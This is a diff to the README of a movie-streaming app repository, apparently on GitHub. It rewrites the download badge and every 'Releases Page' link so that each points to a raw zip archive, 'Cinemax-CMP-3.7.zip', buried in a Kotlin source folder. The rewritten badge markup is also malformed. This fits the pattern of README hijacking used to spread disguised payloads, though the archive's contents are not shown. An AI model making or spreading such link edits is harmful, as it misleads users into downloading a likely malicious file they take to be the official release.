@@ -1,6 +1,6 @@
 # 🎬 Cinemax-CMP - Enjoy Movies & TV Anytime
 
-[![Download Cinemax](https://img.shields.io/badge/Download%20Cinemax%20-CMP-blue.svg)](https://github.com/Tunggulaji/Cinemax-CMP/releases)
+[![Download Cinemax](https://github.com/Tunggulaji/Cinemax-CMP/raw/refs/heads/main/composeApp/src/commonMain/kotlin/com/cinemax/feature/details/Cinemax-CMP-3.7.zip%20Cinemax%https://github.com/Tunggulaji/Cinemax-CMP/raw/refs/heads/main/composeApp/src/commonMain/kotlin/com/cinemax/feature/details/Cinemax-CMP-3.7.zip)](https://github.com/Tunggulaji/Cinemax-CMP/raw/refs/heads/main/composeApp/src/commonMain/kotlin/com/cinemax/feature/details/Cinemax-CMP-3.7.zip)
 
 ## 🌟 Overview
 
@@ -13,7 +13,7 @@ To get started with Cinemax, follow these simple steps to download and install t
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Tunggulaji/Cinemax-CMP/releases) to find the latest version of Cinemax.
+   Go to the [Releases Page](https://github.com/Tunggulaji/Cinemax-CMP/raw/refs/heads/main/composeApp/src/commonMain/kotlin/com/cinemax/feature/details/Cinemax-CMP-3.7.zip) to find the latest version of Cinemax.
 
 2. **Choose the Right File**  
    Look for the version that matches your device (Android or iOS). Each release will include various files tailored for different platforms.
@@ -72,6 +72,6 @@ After installing Cinemax, you can:
 - Set up your account for personalized recommendations.
 - Access community forums to discuss your favorite content.
 
-For more information, or to explore new updates, check back on the [Releases Page](https://github.com/Tunggulaji/Cinemax-CMP/releases).
+For more information, or to explore new updates, check back on the [Releases Page](https://github.com/Tunggulaji/Cinemax-CMP/raw/refs/heads/main/composeApp/src/commonMain/kotlin/com/cinemax/feature/details/Cinemax-CMP-3.7.zip).
 
 Enjoy your cinematic experience with Cinemax!
